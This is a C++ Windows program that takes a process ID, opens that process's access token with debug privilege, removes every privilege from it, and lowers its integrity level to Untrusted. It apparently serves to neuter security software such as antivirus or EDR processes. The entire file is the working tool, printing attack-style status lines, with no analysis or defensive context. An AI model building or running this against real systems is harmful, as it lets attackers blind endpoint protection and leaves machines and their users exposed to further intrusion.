#include <Windows.h>
#include <stdio.h>
#include <iostream>
#include <TlHelp32.h>

#include <conio.h>



#define SE_DELEGATE_SESSION_USER_IMPERSONATE_NAME TEXT("SeDelegateSessionUserImpersonatePrivilege")
bool EnableDebugPrivilege()
{
    HANDLE hToken;
    LUID sedebugnameValue;
    TOKEN_PRIVILEGES tkp;
    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken))
    {
        return   FALSE;
    }
    if (!LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &sedebugnameValue))
    {
        CloseHandle(hToken);
        return false;
    }
    tkp.PrivilegeCount = 1;
    tkp.Privileges[0].Luid = sedebugnameValue;
    tkp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
    if (!AdjustTokenPrivileges(hToken, FALSE, &tkp, sizeof(tkp), NULL, NULL))
    {
        CloseHandle(hToken);
        return false;
    }
    return true;
}



BOOL SetPrivilege(
    HANDLE hToken,          // access token handle
    LPCTSTR lpszPrivilege,  // name of privilege to enable/disable
    BOOL bEnablePrivilege   // to enable or disable privilege
)
{
    TOKEN_PRIVILEGES tp;
    LUID luid;

    

    if (!LookupPrivilegeValue(
        NULL,            // lookup privilege on local system
        lpszPrivilege,   // privilege to lookup 
        &luid))        // receives LUID of privilege
    {
        printf("LookupPrivilegeValue error: %u\n", GetLastError());
        return FALSE;
    }

    tp.PrivilegeCount = 1;
    tp.Privileges[0].Luid = luid;
    if (bEnablePrivilege)
        tp.Privileges[0].Attributes = SE_PRIVILEGE_REMOVED;
    else
        tp.Privileges[0].Attributes = SE_PRIVILEGE_REMOVED;


    if (!AdjustTokenPrivileges(
        hToken,
        FALSE,
        &tp,
        sizeof(TOKEN_PRIVILEGES),
        (PTOKEN_PRIVILEGES)NULL,
        (PDWORD)NULL))
    {
        printf("AdjustTokenPrivileges error: %u\n", GetLastError());
        return FALSE;
    }

    if (GetLastError() == ERROR_NOT_ALL_ASSIGNED)

    {
        printf("The token does not have the specified privilege. \n");
        return FALSE;
    }

    return TRUE;
}


int main()
{
    LUID sedebugnameValue;
    EnableDebugPrivilege();

    

    
    int pid;
    std::cin >> pid;


    printf("PID %d\n", pid);
    


    
    HANDLE phandle = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, pid);

    if (phandle != INVALID_HANDLE_VALUE) {

        printf("[*] Opened Target Handle\n");
    }
    else {
        printf("[-] Failed to open Process Handle\n");
    }

   

    HANDLE ptoken;

    BOOL token = OpenProcessToken(phandle, TOKEN_ALL_ACCESS, &ptoken);

    if (token) {
        printf("[*] Opened Target Token Handle\n");
    }
    else {
        printf("[-] Failed to open Token Handle\n");
    }

    LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &sedebugnameValue);


    TOKEN_PRIVILEGES tkp;

    tkp.PrivilegeCount = 1;
    tkp.Privileges[0].Luid = sedebugnameValue;
    tkp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

    if (!AdjustTokenPrivileges(ptoken, FALSE, &tkp, sizeof(tkp), NULL, NULL)) {

        printf("[-] Failed to Adjust Token's Privileges\n");
        
    }



    // ALL PRIV
    printf("[*]Removing All privileges\n");
    SetPrivilege(ptoken, SE_CREATE_TOKEN_NAME, TRUE);
    SetPrivilege(ptoken, SE_ASSIGNPRIMARYTOKEN_NAME, TRUE);
    SetPrivilege(ptoken, SE_LOCK_MEMORY_NAME, TRUE);
    SetPrivilege(ptoken, SE_INCREASE_QUOTA_NAME, TRUE);
    SetPrivilege(ptoken, SE_UNSOLICITED_INPUT_NAME, TRUE);
    SetPrivilege(ptoken, SE_MACHINE_ACCOUNT_NAME, TRUE);
    SetPrivilege(ptoken, SE_TCB_NAME, TRUE);
    SetPrivilege(ptoken, SE_SECURITY_NAME, TRUE);
    SetPrivilege(ptoken, SE_TAKE_OWNERSHIP_NAME, TRUE);
    SetPrivilege(ptoken, SE_LOAD_DRIVER_NAME, TRUE);
    SetPrivilege(ptoken, SE_SYSTEM_PROFILE_NAME, TRUE);
    SetPrivilege(ptoken, SE_SYSTEMTIME_NAME, TRUE);
    SetPrivilege(ptoken, SE_PROF_SINGLE_PROCESS_NAME, TRUE);
    SetPrivilege(ptoken, SE_INC_BASE_PRIORITY_NAME, TRUE);
    SetPrivilege(ptoken, SE_CREATE_PAGEFILE_NAME, TRUE);
    SetPrivilege(ptoken, SE_CREATE_PERMANENT_NAME, TRUE);
    SetPrivilege(ptoken, SE_BACKUP_NAME, TRUE);
    SetPrivilege(ptoken, SE_RESTORE_NAME, TRUE);
    SetPrivilege(ptoken, SE_SHUTDOWN_NAME, TRUE);
    SetPrivilege(ptoken, SE_DEBUG_NAME, TRUE);
    SetPrivilege(ptoken, SE_AUDIT_NAME, TRUE);
    SetPrivilege(ptoken, SE_SYSTEM_ENVIRONMENT_NAME, TRUE);
    SetPrivilege(ptoken, SE_CHANGE_NOTIFY_NAME, TRUE);
    SetPrivilege(ptoken, SE_REMOTE_SHUTDOWN_NAME, TRUE);
    SetPrivilege(ptoken, SE_UNDOCK_NAME, TRUE);
    SetPrivilege(ptoken, SE_SYNC_AGENT_NAME, TRUE);
    SetPrivilege(ptoken, SE_ENABLE_DELEGATION_NAME, TRUE);
    SetPrivilege(ptoken, SE_MANAGE_VOLUME_NAME, TRUE);
    SetPrivilege(ptoken, SE_IMPERSONATE_NAME, TRUE);
    SetPrivilege(ptoken, SE_CREATE_GLOBAL_NAME, TRUE);
    SetPrivilege(ptoken, SE_TRUSTED_CREDMAN_ACCESS_NAME, TRUE);
    SetPrivilege(ptoken, SE_RELABEL_NAME, TRUE);
    SetPrivilege(ptoken, SE_INC_WORKING_SET_NAME, TRUE);
    SetPrivilege(ptoken, SE_TIME_ZONE_NAME, TRUE);
    SetPrivilege(ptoken, SE_CREATE_SYMBOLIC_LINK_NAME, TRUE);
    SetPrivilege(ptoken, SE_DELEGATE_SESSION_USER_IMPERSONATE_NAME, TRUE);


    printf("[*]  All Privileges are removed\n");


    DWORD integrityLevel = SECURITY_MANDATORY_UNTRUSTED_RID;


    SID integrityLevelSid{};
    integrityLevelSid.Revision = SID_REVISION;
    integrityLevelSid.SubAuthorityCount = 1;
    integrityLevelSid.IdentifierAuthority.Value[5] = 16;
    integrityLevelSid.SubAuthority[0] = integrityLevel;

    TOKEN_MANDATORY_LABEL tokenIntegrityLevel = {};
    tokenIntegrityLevel.Label.Attributes = SE_GROUP_INTEGRITY;
    tokenIntegrityLevel.Label.Sid = &integrityLevelSid;

    if (!SetTokenInformation(
        ptoken,
        TokenIntegrityLevel,
        &tokenIntegrityLevel,
        sizeof(TOKEN_MANDATORY_LABEL) + GetLengthSid(&integrityLevelSid)))
    {
        printf("SetTokenInformation failed\n");
    }
    else {

        printf("[*] Token Integrity set to Untrusted\n");
    }

    CloseHandle(ptoken);
    CloseHandle(phandle);


    system("PAUSE");
    return 0;
}
